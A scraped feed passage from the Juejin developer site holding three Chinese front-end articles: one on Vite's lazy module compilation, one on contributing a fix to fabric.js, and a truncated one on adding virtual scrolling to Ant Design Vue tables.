<li>浏览器执行 <code>App.vue</code> 的 JS，发现：<strong>js</strong>编辑</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Header</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/Header.vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/Home.vue'</span>;
</code></pre>
<ul>
<li>浏览器再次自动发起两个请求：<strong>bash</strong>编辑</li>
</ul>
<pre><code class="hljs language-css" lang="css">GET /<span class="hljs-attribute">src</span>/components/<span class="hljs-selector-tag">Header</span><span class="hljs-selector-class">.vue</span>
GET /<span class="hljs-attribute">src</span>/components/Home<span class="hljs-selector-class">.vue</span>
</code></pre>
<ul>
<li>Vite 分别编译这两个文件，返回对应的 JS</li>
</ul>
<hr/>
<h3 data-id="heading-11"><strong>第六步：最终渲染页面</strong></h3>
<ul>
<li>所有模块都加载完毕</li>
<li>浏览器执行所有代码，渲染出：<strong>html</strong>预览</li>
</ul>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">div</span>&gt;
  &lt;<span class="hljs-selector-tag">header</span>&gt;My App&lt;/<span class="hljs-selector-tag">header</span>&gt;
  &lt;<span class="hljs-selector-tag">main</span>&gt;Welcome <span class="hljs-selector-tag">to</span> Home&lt;/<span class="hljs-selector-tag">main</span>&gt;
&lt;/<span class="hljs-selector-tag">div</span>&gt;
</code></pre>
<hr/>
<h2 data-id="heading-12"><strong>全流程总结（时间线）</strong></h2>





































<table><thead><tr><th><strong>时间</strong></th><th><strong>事件</strong></th></tr></thead><tbody><tr><td>t=0</td><td>浏览器请求 <code>/src/main.js</code></td></tr><tr><td>t=50ms</td><td>Vite 返回 <code>main.js</code></td></tr><tr><td>t=100ms</td><td>浏览器执行 <code>main.js</code>，请求 <code>/src/App.vue</code></td></tr><tr><td>t=150ms</td><td>Vite 编译并返回 <code>App.vue</code></td></tr><tr><td>t=200ms</td><td>浏览器执行 <code>App.vue</code>，请求 <code>Header.vue</code>和 <code>Home.vue</code></td></tr><tr><td>t=250ms</td><td>Vite 编译并返回两个组件</td></tr><tr><td>t=300ms</td><td>页面渲染完成</td></tr></tbody></table>
<p><strong>总耗时：&lt; 500ms</strong>，且只处理了实际使用的模块！</p>
<hr/>
<h2 data-id="heading-13"><strong>对比：如果用 Webpack 会怎样？</strong></h2>
<p>Webpack 会在启动时：</p>
<ol>
<li>扫描 <code>main.js</code> → <code>App.vue</code> → <code>Header.vue</code> → <code>Home.vue</code></li>
<li>把所有这些文件<strong>全量编译</strong>成一个 bundle（如 <code>app.js</code>）</li>
<li>再返回给浏览器</li>
</ol>
<p>即使你只是想看首页，也得等整个项目打包完！</p>
<hr/>
<h2 data-id="heading-14"><strong>关键结论</strong></h2>
<p><strong>Vite 的“快”，来自于“懒”</strong><br/>
它不提前做任何事，只在你真正需要某个模块时，才去编译它。</p>
<p>这就像：</p>
<ul>
<li><strong>Webpack</strong>：先煮一锅汤，再分碗吃</li>
<li><strong>Vite</strong>：你点什么菜，我现炒什么，立刻上桌</li>
</ul>
<p>这就是为什么 Vite 启动速度能秒杀传统打包工具的原因。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[迈向开源第一步，给fabric.js提PR]]></title>    <link>https://juejin.cn/post/7591806035758284842</link>    <guid>https://juejin.cn/post/7591806035758284842</guid>    <pubDate>2026-01-06T06:23:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591806035758284842" data-draft-id="7591788451029762091" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="迈向开源第一步，给fabric.js提PR"/> <meta itemprop="keywords" content="前端,JavaScript,前端框架"/> <meta itemprop="datePublished" content="2026-01-06T06:23:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CC码码"/> <meta itemprop="url" content="https://juejin.cn/user/3800389147179720"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            迈向开源第一步，给fabric.js提PR
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3800389147179720/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CC码码
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:23:40.000Z" title="Tue Jan 06 2026 06:23:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是CC，在这里欢迎大家的到来～</p>
<h2 data-id="heading-0">开场</h2>
<p>今天这篇文章主要是想分享一下给 fabric.js 从提 issues 到后边合并 PR 的过程。之前在公司业务中有了一些对 fabric.js 源代码的阅读、调试以及修改，就想着看看能不能给开源做些贡献；在测试了 fabric.js 最新版本也没有修复问题的情况下就开始尝试提 issues。</p>
<h2 data-id="heading-1">提 issues</h2>
<p>新开 issues 按照规范填写发现的 Bug 的相关内容（可以参考别人 issues 的书写），像发现 Bug 的版本、环境、复现步骤、期望的结果和实际的结果等，需如实填写。</p>
<p>后续仓库主理人就会在这个 issues 下进行沟通，在这里也可以表明你正在尝试修复此问题，主理人也会告诉后续合并到哪些分支。</p>
<h2 data-id="heading-2">阅读开源库的文档</h2>
<p>在开发前需要先阅读代码库文档，了解如何规范提问，如何提交 issues，如何参与问题的修复等等。这一步的需要详细阅读。</p>
<p>像 fabric.js 的贡献流程文档，从内容中可以看到它详细罗列一步步的操作以及鼓励参与，真的非常友好了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/509d2bb9fef94d4da576721eb033e0b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ0PnoIHnoIE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768285420&amp;x-signature=LgSLG9R%2F07wgWgWXz35lKUdnnss%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">Fork 代码开发</h2>
<p>开发前需要 Fork 一份代码到个人的仓库中，如果之前 Fork 过导致代码长时间未更新的话需要点击“Update branch”拉去最新代码。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/399f8967c0c046fea94198eb5d8af8b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ0PnoIHnoIE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768285420&amp;x-signature=HsOaT27SM1zR8zvPTr1yYAkhnhc%3D" alt="" loading="lazy"/></p>
<p>接下来把代码克隆到本地，基于 master 新建分支（分支名称可以参考原仓库其他人的分支命名）。</p>
<h2 data-id="heading-4">跑通测试用例</h2>
<p>测试用例之前也没写过，这里仓库主理人也给了一部分帮助和建议。</p>
<p>当时写了个 unit 测试用例，然后需要执行 package.json 中的测试脚本，确保测试用例通过后再提交。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">describe</span>(<span class="hljs-string">'measuring, splitting'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">it</span>(<span class="hljs-string">'measuring a single char'</span>, <span class="hljs-function">() =&gt;</span> {
    cache.<span class="hljs-title function_">clearFontCache</span>();
    <span class="hljs-keyword">const</span> text = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FabricText</span>(<span class="hljs-string">''</span>);
    <span class="hljs-keyword">const</span> style = text.<span class="hljs-title function_">getCompleteStyleDeclaration</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">const</span> measurement1 = text.<span class="hljs-title function_">_measureChar</span>(<span class="hljs-string">'a'</span>, style, <span class="hljs-string">''</span>, style);
    <span class="hljs-keyword">const</span> measurement2 = text.<span class="hljs-title function_">_measureChar</span>(<span class="hljs-string">'a'</span>, style, <span class="hljs-string">''</span>, style);
    <span class="hljs-title function_">expect</span>(measurement1).<span class="hljs-title function_">toEqual</span>(measurement2);
    <span class="hljs-keyword">const</span> cacheKeys = cache.<span class="hljs-property">charWidthsCache</span>
      .<span class="hljs-title function_">get</span>(text.<span class="hljs-property">fontFamily</span>.<span class="hljs-title function_">toLowerCase</span>())
      ?.<span class="hljs-title function_">get</span>(<span class="hljs-string">'normal_normal'</span>)
      ?.<span class="hljs-title function_">keys</span>();
    <span class="hljs-title function_">expect</span>(cacheKeys?.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>).<span class="hljs-property">not</span>.<span class="hljs-title function_">toBe</span>(<span class="hljs-string">'undefineda'</span>);
</code></pre>
<h2 data-id="heading-5">提 PR</h2>
<p>把功能分支通过 Github 平台的 Pull requests 模块进行提交，从图中可以看到是从个人仓库的 Fork 仓库的功能分支合并到原仓库的 master 分支进行的提交合并。这里也注意填写标题和描述。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14887116b11f4e29b3ef5b260d2c5c48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ0PnoIHnoIE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768285420&amp;x-signature=r4p5evRHpad1bMTBon7ySxxFGlc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">等待与回复</h2>
<p>在仓库主理人阅读了 Pull requests 后会进行评审，看是否缺少测试用例以及提审代码是否符合规范等等。这里需要多耐心沟通，可能主理人和我们有着时差。</p>
<h2 data-id="heading-7">耐心等待</h2>
<p>在有主理人 review 代码后只需要耐心等待，在下一次版本更像时就会被合并到 master 以及新版本。</p>
<h2 data-id="heading-8">总结</h2>
<p>整个流程走下来，我最深的体会是：开源社区远比想象中更友好。刚开始提 issue 时难免忐忑，担心问题太简单或表达不清晰，但实际上，维护者往往非常耐心，甚至主动引导你如何修复。从阅读贡献规范、跑通测试，到接受代码审查，每一步都是宝贵的学习。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[给 Ant Design Vue 装上"涡轮增压"：虚拟列表封装实践]]></title>    <link>https://juejin.cn/post/7591871204568399898</link>    <guid>https://juejin.cn/post/7591871204568399898</guid>    <pubDate>2026-01-06T06:22:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591871204568399898" data-draft-id="7591986565853872174" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="给 Ant Design Vue 装上&quot;涡轮增压&quot;：虚拟列表封装实践"/> <meta itemprop="keywords" content="前端,JavaScript,Vue.js"/> <meta itemprop="datePublished" content="2026-01-06T06:22:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="baozj"/> <meta itemprop="url" content="https://juejin.cn/user/2447932817411454"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            给 Ant Design Vue 装上"涡轮增压"：虚拟列表封装实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2447932817411454/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    baozj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:22:10.000Z" title="Tue Jan 06 2026 06:22:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#444}.hljs-keyword,.hljs-link,.hljs-literal,.hljs-section,.hljs-selector-tag{color:#fff}.hljs-subst,.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#ddd}.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-bullet,.hljs-name,.hljs-string,.hljs-symbol,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#d88}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#777}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-strong,.hljs-title,.hljs-type{font-weight:700}.hljs-emphasis{font-style:italic}</style><h2 data-id="heading-0">前言</h2>
<p>如果你用过 Ant Design Vue 的 Table 组件渲染过上万条数据，你一定体验过那种"浏览器在思考人生"的感觉。页面卡顿、滚动掉帧，仿佛在对你说："兄弟，我真的尽力了。"</p>
<p>问题的根源很简单：Ant Design Vue 的 Table 组件并不支持虚拟列表。当你塞给它 10 万条数据时，它会老老实实地把这 10 万个 DOM 节点全部渲染出来。浏览器：我谢谢你啊。</p>
<p>于是，这个项目诞生了——基于 Ant Design Vue 二次封装，让它也能享受虚拟列表的"涡轮增压"。</p>
<h2 data-id="heading-1">什么是虚拟列表？</h2>
<p>简单来说，虚拟列表就是一种"障眼法"。用户看起来在滚动一个包含 10 万条数据的列表，但实际上浏览器只渲染了可视区域内的那几十条数据。当你滚动时，组件会动态计算应该显示哪些数据，然后快速替换 DOM。</p>
<p>这就像是火车车窗外的风景：你坐在车厢里，透过窗户看到的永远只是窗外那一小片景色，但随着火车移动，窗外的景色不断变化，给你一种穿越了整片大地的感觉。虚拟列表也是如此，可视区域就是那扇窗户，数据就是窗外的风景。</p>
<h2 data-id="heading-2">核心实现：站在巨人的肩膀上</h2>
<p>这个项目的核心是 <code>@vueuse/core</code> 提供的 <code>useVirtualList</code> hook。VueUse 是一个优秀的 Vue 组合式 API 工具集，而 <code>useVirtualList</code> 就是其中专门用来实现虚拟列表的工具。</p>
<p>让我们看看关键代码：</p>
<pre><code class="hljs language-vue" lang="vue">const { list, containerProps, wrapperProps } = useVirtualList(
  computed(() =&gt; props.dataSource),
  {
    itemHeight: props.rowHeight,
    overscan: 10,
  },
)
</code></pre>
<h3 data-id="heading-3">必要参数解析</h3>
<h4 data-id="heading-4">1. <strong>数据源（第一个参数）</strong></h4>
<p>这里传入的是一个响应式的数据源。 <code>computed(() =&gt; props.dataSource)</code>，当父组件传入的数据变化时，虚拟列表会自动更新。</p>
<h4 data-id="heading-5">2. <strong>itemHeight（行高）</strong></h4>
<p>这是虚拟列表的"灵魂参数"。它告诉 <code>useVirtualList</code>："嘿，我的每一行有多高。"有了这个信息，它才能准确计算出：</p>
<ul>
<li>可视区域能显示多少行</li>
<li>滚动到某个位置时应该显示哪些数据</li>
<li>整个列表的总高度是多少</li>
</ul>
<p><strong>重要提示</strong>：这个值必须尽可能准确。如果你设置的行高和实际渲染的行高不一致，滚动时就会出现"跳跃"或"错位"的问题。在我们的实现中，默认值是 55px，这是 Ant Design Vue Table 的默认行高。</p>
<h4 data-id="heading-6">3. <strong>overscan（预渲染数量）</strong></h4>
<p>这是一个性能优化参数。它的意思是："除了可视区域的数据，我还要多渲染上下各 10 条数据。"</p>
<p>为什么要这么做？想象一下，如果只渲染可视区域的数据，当用户快速滚动时，新的数据可能来不及渲染，就会出现短暂的空白。通过预渲染一些数据，可以让滚动更加流畅。</p>
<p>当然，这个值也不能设置太大，否则就失去了虚拟列表的意义。10 是一个比较平衡的值。</p>
<h3 data-id="heading-7">返回值解析：虚拟列表的"三剑客"</h3>
<p><code>useVirtualList</code> 返回了三个关键对象，它们各司其职，共同完成虚拟列表的魔法。</p>
<h4 data-id="heading-8">1. <strong>list</strong> - 数据的"精选集"</h4>
<p>这是当前应该渲染的数据列表。注意，这不是完整的数据源，而是经过计算后，当前可视区域（加上 overscan）应该显示的数据。</p>
<p>数据结构如下：</p>
<pre><code class="hljs language-javascript" lang="javascript">[
  { <span class="hljs-attr">data</span>: 原始数据, <span class="hljs-attr">index</span>: 在完整列表中的索引 },
  { <span class="hljs-attr">data</span>: 原始数据, <span class="hljs-attr">index</span>: 在完整列表中的索引 },
  ...
]
</code></pre>
